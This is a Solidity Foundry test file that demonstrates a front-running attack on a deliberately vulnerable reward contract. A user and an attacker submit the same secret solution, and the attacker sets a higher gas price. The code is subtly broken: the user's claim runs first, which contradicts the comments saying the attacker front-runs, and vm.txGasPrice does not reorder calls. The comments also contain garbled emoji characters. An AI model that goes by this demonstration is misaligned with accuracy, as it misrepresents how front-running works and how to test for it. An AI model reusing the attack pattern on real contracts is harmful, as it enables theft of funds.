// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/VulnerableFrontRunning.sol";

contract FrontRunningExploitTest is Test {
    VulnerableFrontRunning public game;
    address public user = address(0x111);
    address public attacker = address(0x222);

    string private correctSolution = "secret123";
    bytes32 private solutionHash = keccak256(abi.encodePacked(correctSolution));

    function setUp() public {
        game = new VulnerableFrontRunning{value: 10 ether}(solutionHash);
        vm.deal(user, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    function testFrontRunningAttack() public {
        console.log("Initial Balances:");
        console.log("User Balance:", user.balance);
        console.log("Attacker Balance:", attacker.balance);
        console.log("Contract Balance:", game.getContractBalance());

        // ðŸŸ¢ Step 1: User submits the solution first (normal gas price)
        vm.startPrank(user);
        console.log("User submits claim...");
        vm.txGasPrice(100 gwei); // Normal gas fee
        game.claimReward(correctSolution);
        vm.stopPrank();

        // ðŸ›‘ Step 2: Attacker front-runs by increasing gas price
        vm.startPrank(attacker);
        console.log("Attacker sees the pending transaction and front-runs!");
        vm.txGasPrice(200 gwei); // Higher gas price
        game.claimReward(correctSolution);
        vm.stopPrank();

        // ðŸ”´ Step 3: User's transaction is mined, but now the contract is empty
        vm.startPrank(user);
        console.log(
            "User's transaction gets processed, but contract has no funds!"
        );
        vm.expectRevert("Not enough funds"); // Should fail
        game.claimReward(correctSolution);
        vm.stopPrank();

        console.log("Final Results:");
        console.log("Updated User Balance:", user.balance);
        console.log("Updated Attacker Balance:", attacker.balance);
        console.log("Final Contract Balance:", game.getContractBalance());
    }
}
